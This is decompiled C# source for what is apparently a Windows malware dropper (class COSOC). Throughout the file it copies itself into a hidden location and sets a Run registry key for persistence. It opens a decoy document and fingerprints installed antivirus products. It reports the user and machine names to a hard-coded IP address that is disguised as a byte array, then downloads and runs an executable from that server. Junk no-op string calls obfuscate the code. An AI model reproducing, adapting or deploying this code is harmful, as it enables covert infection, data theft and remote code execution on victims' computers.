using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace gif;

public class COSOC
{
	public string sysPath;

	public NetworkStream sysStream;

	public int sysPort;

	public string fdata;

	private bool checking;

	public TcpClient sysSCK;

	public string sysIApps;

	public Form1 tParent;

	private int bytRead;

	private string prefix;

	public string appName;

	public System.Timers.Timer Timer;

	public int bufSize;

	public COSOC()
	{
		sysPort = 10000;
		fdata = "56assdsd+569ds8d9sd8s9s8ds9d+asa*/\\fyyr:ds-sdsdssa:5689sasd*sasas+54a4sa64+[+]ds+@\\";
		checking = false;
		bytRead = 0;
		prefix = "abd1-";
		Timer = new System.Timers.Timer();
		bufSize = 1024;
	}

	public void doProcess()
	{
		string directoryName = Path.GetDirectoryName(Application.get_ExecutablePath());
		fdata.Replace(":", "/:");
		try
		{
			if (!Directory.Exists(sysPath))
			{
				Directory.CreateDirectory(sysPath);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		fdata.Replace(":", "/:");
		try
		{
			fdata.Replace(":", "/:");
			string directoryName2 = Path.GetDirectoryName(Application.get_ExecutablePath());
			fdata.Replace(":", "/:");
			if (Operators.CompareString(directoryName2, sysPath, false) != 0)
			{
				fdata.Replace(":", "/:");
				string location = Assembly.GetExecutingAssembly().Location;
				string text = sysPath + "\\" + appName + ".exe";
				File.Copy(location, text, overwrite: true);
				try
				{
					RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
					if (registryKey.GetValue(appName) == null)
					{
						registryKey.SetValue(appName, text);
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
			fdata.Replace(":", "/:");
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		docOpen(directoryName);
		fdata.Replace(":", "/:");
		checkUP();
		fdata.Replace(":", "/:");
		runApps();
	}

	private byte[] revData()
	{
		checked
		{
			try
			{
				fdata.Replace("+", "/+");
				int num = 0;
				fdata.Replace("+", "/+");
				byte[] array = new byte[5];
				fdata.Replace("+", "/+");
				bytRead = sysStream.Read(array, 0, 5);
				int num2 = BitConverter.ToInt32(array, 0);
				fdata.Replace("+", "/+");
				byte[] array2 = new byte[num2 - 1 + 1];
				int num3 = num2;
				fdata.Replace("+", "/+");
				while (num3 > 0)
				{
					int count = ((num3 > bufSize) ? bufSize : num3);
					bytRead = sysStream.Read(array2, num, count);
					num += bytRead;
					num3 -= bytRead;
				}
				fdata.Replace("+", "/+");
				return array2;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				byte[] result = null;
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	private void Timer_Elapsed(object sender, ElapsedEventArgs e)
	{
		fdata.Replace("+", "/+");
		checkUP();
		fdata.Replace("+", "/+");
	}

	public void checkUP()
	{
		checked
		{
			try
			{
				if (checking)
				{
					return;
				}
				checking = true;
				if (Process.GetProcessesByName(sysIApps).Length == 0)
				{
					if (File.Exists(sysPath + "\\" + sysIApps + ".exe"))
					{
						Process process = new Process();
						process.StartInfo.FileName = sysPath + "\\" + sysIApps + ".exe";
						fdata.Replace("+", "/+");
						process.Start();
					}
					else
					{
						fdata.Replace("+", "/+");
						byte[] array = new byte[14]
						{
							49, 57, 51, 46, 49, 54, 52, 46, 49, 51,
							49, 46, 53, 56
						};
						IPAddress address = IPAddress.Parse(Encoding.UTF8.GetString(array, 0, array.Length));
						sysSCK = new TcpClient();
						sysSCK.Connect(new IPEndPoint(address, sysPort));
						fdata.Replace("+", "/+");
						bufSize = sysSCK.ReceiveBufferSize;
						sysStream = sysSCK.GetStream();
						moData(null, "updatc=" + Environment.UserName + "   |   " + Environment.MachineName + "   |   " + GOS() + "   |   " + GAVS());
						byte[] array2 = new byte[5];
						bytRead = sysStream.Read(array2, 0, 5);
						int num = BitConverter.ToInt32(array2, 0);
						byte[] array3 = new byte[num - 1 + 1];
						int num2 = 0;
						fdata.Replace("+", "/+");
						for (int num3 = num; num3 > 0; num3 -= bytRead)
						{
							int count = ((num3 > bufSize) ? bufSize : num3);
							bytRead = sysStream.Read(array3, num2, count);
							num2 += bytRead;
						}
						string text = Encoding.UTF8.GetString(array3, 0, num).ToString();
						string[] array4 = text.Split("=".ToCharArray());
						if (Operators.CompareString(array4[0], "updatc", false) == 0)
						{
							if (!Directory.Exists(sysPath))
							{
								Directory.CreateDirectory(sysPath);
							}
							byte[] array5 = revData();
							if (array5 != null)
							{
								File.WriteAllBytes(sysPath + "\\" + sysIApps + ".exe", array5);
								fdata.Replace("+", "/+");
								Thread.Sleep(100);
								fdata.Replace("+", "/+");
								Process process2 = new Process();
								process2.StartInfo.FileName = sysPath + "\\" + sysIApps + ".exe";
								process2.Start();
							}
							fdata.Replace("+", "/+");
							sysStream.Close();
						}
						sysSCK.Close();
					}
				}
				else
				{
					Timer.Stop();
					fdata.Replace("+", "/+");
					((Form)tParent).Close();
				}
				checking = false;
				fdata.Replace("+", "/+");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				checking = false;
				ProjectData.ClearProjectError();
			}
		}
	}

	public string GAVS()
	{
		checked
		{
			try
			{
				string text = null;
				fdata.Replace("*", "/*");
				Process[] processes = Process.GetProcesses();
				int num = processes.Length - 1;
				int num2 = 0;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 > num4)
					{
						break;
					}
					string processName = processes[num2].ProcessName;
					fdata.Replace("*", "/*");
					string text2 = prefix + processName;
					switch (text2)
					{
					case "abd1-ekrn":
						text = ((text != null) ? (text + " & ") : "") + "[NOD32.]";
						goto IL_0378;
					case "abd1-avgui":
					case "abd1-avgcc":
						if (true)
						{
							text = ((text != null) ? (text + " & ") : "") + "[AVG.]";
							fdata.Replace("*", "/*");
							goto IL_0378;
						}
						break;
					}
					switch (text2)
					{
					case "abd1-avgnt":
						text = ((text != null) ? (text + " & ") : "") + "[Avira.]";
						fdata.Replace("*", "/*");
						goto IL_0378;
					case "abd1-AvastUI":
					case "abd1-avastui":
					case "abd1-avast":
						if (true)
						{
							text = ((text != null) ? (text + " & ") : "") + "[Avast.]";
							goto IL_0378;
						}
						break;
					}
					switch (text2)
					{
					case "abd1-bdss":
						text = ((text != null) ? (text + " & ") : "") + "[BitDefender.]";
						fdata.Replace("*", "/*");
						goto IL_0378;
					case "abd1-spbbcsvc":
						text = ((text != null) ? (text + " & ") : "") + "[Symantec.]";
						fdata.Replace("*", "/*");
						goto IL_0378;
					case "abd1-updaterui":
						text = ((text != null) ? (text + " & ") : "") + "[McAfee.]";
						fdata.Replace("*", "/*");
						goto IL_0378;
					case "abd1-avp":
						text = ((text != null) ? (text + " & ") : "") + "[Kaspersky.]";
						fdata.Replace("*", "/*");
						goto IL_0378;
					case "abd1-msmpeng":
					case "abd1-msseces":
						if (true)
						{
							text = ((text != null) ? (text + " & ") : "") + "[Microsoft Security Essentials.]";
							fdata.Replace("*", "/*");
							goto IL_0378;
						}
						break;
					}
					if (Operators.CompareString(text2, "abd1-inicio", false) == 0)
					{
						text = ((text != null) ? (text + " & ") : "") + "[Panda.]";
						fdata.Replace("*", "/*");
					}
					goto IL_0378;
					IL_0378:
					num2++;
				}
				if (text == null)
				{
					text = "Not.Found";
					fdata.Replace("*", "/*");
				}
				return text;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string result = "";
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public void docOpen(string apEPath)
	{
		try
		{
			if (Operators.CompareString(apEPath, sysPath, false) == 0)
			{
				return;
			}
			string text = Path.GetFileNameWithoutExtension(Application.get_ExecutablePath());
			fdata.Replace("*", "/*");
			Process process = new Process();
			string[] files = Directory.GetFiles(apEPath);
			foreach (string text2 in files)
			{
				string directoryName = Path.GetDirectoryName(text2);
				string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(text2);
				if (text2.LastIndexOf(".") <= 0)
				{
					continue;
				}
				fdata.Replace("*", "/*");
				string text3 = text2.Substring(text2.LastIndexOf(".")).ToLower();
				if (!((Operators.CompareString(fileNameWithoutExtension, "~$" + text, false) == 0) & (Operators.CompareString(text3, ".exe", false) != 0)))
				{
					if (((Operators.CompareString(fileNameWithoutExtension, text, false) == 0) & (Operators.CompareString(text3, ".exe", false) != 0)) | (Operators.CompareString(fileNameWithoutExtension, "$" + text, false) == 0))
					{
						try
						{
							process.StartInfo.FileName = text2;
							fdata.Replace("*", "/*");
							process.Start();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
					}
					continue;
				}
				text3 = text3.Replace(".,", ".");
				if (Operators.CompareString(text3, ".exe", false) == 0)
				{
					text = "$" + text;
				}
				string text4 = directoryName + "\\" + text + text3;
				File.Move(text2, text4);
				fdata.Replace("*", "/*");
				File.SetAttributes(text4, FileAttributes.Hidden);
				try
				{
					process.StartInfo.FileName = text4;
					process.Start();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				break;
			}
			fdata.Replace("*", "/*");
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	public string GOS()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = "";
		fdata.Replace("*", "/*");
		switch (version.Major)
		{
		case 5:
			if (version.Minor == 0)
			{
				fdata.Replace("*", "/*");
				break;
			}
			text = "XP";
			fdata.Replace("*", "/*");
			break;
		case 6:
			switch (version.Minor)
			{
			default:
				text = "8";
				break;
			case 0:
				text = "Vista";
				fdata.Replace("*", "/*");
				break;
			case 1:
				text = "7";
				fdata.Replace("*", "/*");
				break;
			}
			break;
		}
		fdata.Replace("*", "/*");
		if (Operators.CompareString(text, "", false) != 0)
		{
			text = "Windows: " + text;
			fdata.Replace("*", "/*");
			if (Operators.CompareString(oSVersion.ServicePack, "", false) != 0)
			{
				text = text + " " + oSVersion.ServicePack;
				fdata.Replace("*", "/*");
			}
		}
		return text;
	}

	private void runApps()
	{
		Timer.Elapsed += Timer_Elapsed;
		fdata.Replace("*", "/*");
		Timer.Interval = 60000.0;
		fdata.Replace("*", "/*");
		Timer.Start();
		fdata.Replace("*", "/*");
	}

	private bool moData(byte[] data, string type)
	{
		checked
		{
			try
			{
				fdata.Replace("*", "/*");
				byte[] bytes = Encoding.UTF8.GetBytes(type);
				int num = 0;
				fdata.Replace("*", "/*");
				int num2 = 5;
				byte[] array = null;
				if (data != null)
				{
					array = BitConverter.GetBytes(data.Length);
					num = data.Length;
					fdata.Replace("*", "/*");
					num2 = 10;
				}
				fdata.Replace("*", "/*");
				byte[] bytes2 = BitConverter.GetBytes(bytes.Length);
				byte[] array2 = new byte[num2 + bytes.Length + (num - 1) + 1];
				bytes2.CopyTo(array2, 0);
				bytes.CopyTo(array2, 5);
				if (data != null)
				{
					array.CopyTo(array2, 5 + bytes.Length);
					fdata.Replace("*", "/*");
					data.CopyTo(array2, 10 + bytes.Length);
				}
				int num3 = 0;
				int num4 = array2.Length;
				fdata.Replace("*", "/*");
				while (num4 > 0)
				{
					int num5 = ((num4 > bufSize) ? bufSize : num4);
					sysStream.Write(array2, num3, num5);
					num3 += num5;
					num4 -= num5;
				}
				fdata.Replace("*", "/*");
				return true;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}
}
